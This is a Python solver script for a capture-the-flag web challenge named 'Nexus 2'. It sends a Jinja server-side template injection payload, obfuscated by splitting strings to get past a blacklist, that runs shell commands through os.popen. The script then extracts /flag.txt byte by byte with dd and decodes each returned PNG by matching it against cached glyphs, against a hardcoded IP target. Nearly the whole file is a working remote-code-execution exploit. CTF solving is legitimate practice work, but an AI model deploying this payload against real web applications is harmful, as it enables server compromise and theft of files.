#!/usr/bin/env python3
"""
Automated solver for the Nexus 2 challenge.

Approach:
1. Abuse the Jinja SSTI to get command execution.
2. Extract /flag.txt one byte at a time with dd.
3. Avoid OCR entirely by rendering known candidate characters normally and
   comparing the returned PNG bytes against the one-byte leaked PNG.

This works because the application's PNG output is deterministic for a given
single-character input.
"""

from __future__ import annotations

import argparse
import string
import subprocess
import sys


DEFAULT_URL = "http://34.126.223.46:18030/"
DEFAULT_CHARSET = string.ascii_letters + string.digits + "_{}-"


def post_name(url: str, name: str) -> bytes:
    cmd = [
        "curl",
        "-sS",
        "--max-time",
        "10",
        "-X",
        "POST",
        "--data-urlencode",
        f"name={name}",
        url,
    ]
    result = subprocess.run(cmd, capture_output=True, check=True)
    body = result.stdout

    if b"Nice try, but that input is not allowed!" in body:
        raise RuntimeError(f"payload blocked by blacklist: {name!r}")

    if not body.startswith(b"\x89PNG\r\n\x1a\n"):
        preview = body[:200].decode("utf-8", "replace")
        raise RuntimeError(f"unexpected non-PNG response for {name!r}: {preview}")

    return body


def build_payload(command: str) -> str:
    escaped = command.replace("\\", "\\\\").replace('"', '\\"')
    return (
        '{{((lipsum|attr("__glo"~"bals__"))["o"~"s"])'
        '|attr("po"~"pen")("'
        + escaped
        + '")|attr("re"~"ad")()}}'
    )


def exploit_png(url: str, command: str) -> bytes:
    return post_name(url, build_payload(command))


def build_templates(url: str, charset: str) -> dict[bytes, str]:
    templates: dict[bytes, str] = {}
    for ch in charset:
        body = post_name(url, ch)
        templates[body] = ch
        print(f"[+] cached glyph for {ch!r}")
    return templates


def recover_flag(url: str, charset: str, max_len: int) -> str:
    templates = build_templates(url, charset)
    blank = exploit_png(url, "printf ''")

    recovered: list[str] = []
    for pos in range(1, max_len + 1):
        # Read exactly one byte, with no trailing newline.
        cmd = f"dd if=/flag.txt bs=1 skip={pos - 1} count=1 2>/dev/null"
        body = exploit_png(url, cmd)

        if body == blank:
            print(f"[+] reached empty output at position {pos}, stopping")
            break

        ch = templates.get(body)
        if ch is None:
            path = f"unknown_pos_{pos}.png"
            with open(path, "wb") as fh:
                fh.write(body)
            raise RuntimeError(
                f"unrecognized glyph at position {pos}; saved raw PNG to {path}"
            )

        recovered.append(ch)
        current = "".join(recovered)
        print(f"[+] pos {pos:02d}: {ch!r} -> {current}")

        if current.startswith("kashiCTF{") and ch == "}":
            print("[+] flag terminator reached")
            break

    return "".join(recovered)


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve the Nexus 2 web challenge")
    parser.add_argument("url", nargs="?", default=DEFAULT_URL, help="challenge base URL")
    parser.add_argument(
        "--charset",
        default=DEFAULT_CHARSET,
        help="candidate characters to template-match",
    )
    parser.add_argument(
        "--max-len",
        type=int,
        default=80,
        help="maximum flag length to try",
    )
    args = parser.parse_args()

    try:
        flag = recover_flag(args.url, args.charset, args.max_len)
    except subprocess.CalledProcessError as exc:
        sys.stderr.write(exc.stderr.decode("utf-8", "replace"))
        return exc.returncode or 1
    except Exception as exc:
        sys.stderr.write(f"[-] {exc}\n")
        return 1

    if not flag:
        sys.stderr.write("[-] failed to recover any flag characters\n")
        return 1

    print(f"\n[+] Flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
